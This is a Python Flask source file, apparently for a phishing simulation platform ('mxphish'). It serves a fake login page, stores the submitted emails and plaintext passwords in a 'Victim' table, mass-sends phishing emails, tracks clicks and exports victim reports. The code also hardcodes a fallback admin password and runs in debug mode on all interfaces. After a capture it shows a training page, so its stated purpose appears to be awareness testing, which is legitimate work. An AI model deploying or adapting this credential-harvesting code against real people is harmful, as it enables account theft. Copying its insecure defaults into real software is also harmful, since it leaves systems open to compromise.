from flask import Flask, render_template, request, redirect, url_for, jsonify, send_file
from database import db, Victim, Campaign
from smtp_sender import send_phishing_email
from auth import auth
from rate_limiter import limiter, email_rate_limiter
from pdf_export import generate_report_pdf
from dotenv import load_dotenv
import os
from datetime import datetime
import json

load_dotenv()
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///phish_sim.db'
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY')
db.init_app(app)
limiter.init_app(app)

# Crear tablas
with app.app_context():
    db.create_all()

# Ruta principal (login falso)
@app.route('/')
def index():
    return render_template('login.html')

# Captura de credenciales
@app.route('/login', methods=['POST'])
def fake_login():
    email = request.form['email']
    password = request.form['password']
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    
    victim = Victim(
        email=email,
        password=password,
        ip=ip,
        user_agent=user_agent
    )
    db.session.add(victim)
    db.session.commit()
    
    campaign = Campaign.query.first()
    if campaign:
        campaign.click_count += 1
        db.session.commit()
    
    return render_template('training.html', email=email)

# DASHBOARD (protegido con autenticación)
@app.route('/dashboard')
@auth.login_required
def dashboard():
    victims = Victim.query.all()
    campaigns = Campaign.query.all()
    
    # Datos para gráficas
    daily_data = {}
    for v in victims:
        date_str = v.timestamp.strftime('%Y-%m-%d')
        daily_data[date_str] = daily_data.get(date_str, 0) + 1
    
    stats = {
        'total_victims': len(victims),
        'total_campaigns': len(campaigns),
        'total_clicks': sum(c.click_count for c in campaigns),
        'recent_victims': victims[-10:][::-1],
        'daily_data': json.dumps(daily_data),
        'labels': json.dumps(list(daily_data.keys())),
        'values': json.dumps(list(daily_data.values()))
    }
    return render_template('dashboard.html', stats=stats, victims=victims)

# API para estadísticas en tiempo real
@app.route('/api/stats')
@auth.login_required
def api_stats():
    victims_count = Victim.query.count()
    campaign = Campaign.query.first()
    sent_count = campaign.sent_count if campaign else 0
    return jsonify({
        'total_caidos': victims_count,
        'total_envios': sent_count,
        'tasa_conversion': round(victims_count / (sent_count or 1) * 100, 2),
        'timestamp': datetime.now().isoformat()
    })

# Formulario para crear campaña
@app.route('/campaign/new', methods=['GET', 'POST'])
@auth.login_required
def new_campaign():
    if request.method == 'POST':
        campaign = Campaign(
            name=request.form['name'],
            subject=request.form['subject'],
            template=request.form['template']
        )
        db.session.add(campaign)
        db.session.commit()
        return redirect('/dashboard')
    return render_template('campaign_form.html')

# Rastreador de clics
@app.route('/track')
def track_click():
    email = request.args.get('email')
    if email:
        print(f"🔍 [TRACK] Usuario {email} hizo clic")
    return redirect('/')

# Envío masivo con rate limiting
@app.route('/send_campaign', methods=['POST'])
@auth.login_required
@limiter.limit("10 per minute")  # máximo 10 peticiones por minuto
def send_campaign():
    data = request.json
    targets = data.get('targets', [])
    
    results = {
        'sent': 0,
        'failed': 0,
        'errors': []
    }
    
    for target in targets[:100]:  # máximo 100 por request
        can_send, message = email_rate_limiter.can_send()
        if not can_send:
            results['errors'].append(f"Rate limit: {message}")
            break
        
        success = send_phishing_email(target['email'], target['name'], "http://localhost:5000/track")
        if success:
            results['sent'] += 1
            email_rate_limiter.record_send()
        else:
            results['failed'] += 1
    
    return jsonify(results)

# Exportar reporte PDF
@app.route('/export/pdf')
@auth.login_required
def export_pdf():
    victims = Victim.query.all()
    campaigns = Campaign.query.all()
    
    stats = {
        'total_victims': len(victims),
        'total_campaigns': len(campaigns),
        'total_clicks': sum(c.click_count for c in campaigns)
    }
    
    pdf_buffer = generate_report_pdf(stats, victims)
    return send_file(
        pdf_buffer,
        as_attachment=True,
        download_name=f"mxphish_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf",
        mimetype='application/pdf'
    )

# Login page para el dashboard (opcional, si quieres evitar HTTP Basic Auth)
@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username == 'admin' and password == os.getenv('DASHBOARD_PASSWORD', 'MX-PHISH2024'):
            # En producción, usar sesiones
            return redirect('/dashboard')
        return render_template('admin_login.html', error="Credenciales inválidas")
    return render_template('admin_login.html')

if __name__ == '__main__':
    # Para desarrollo
    app.run(debug=True, host='0.0.0.0', port=5000)
    
    # Para producción con HTTPS (descomentar y configurar)
    # app.run(debug=False, host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'))
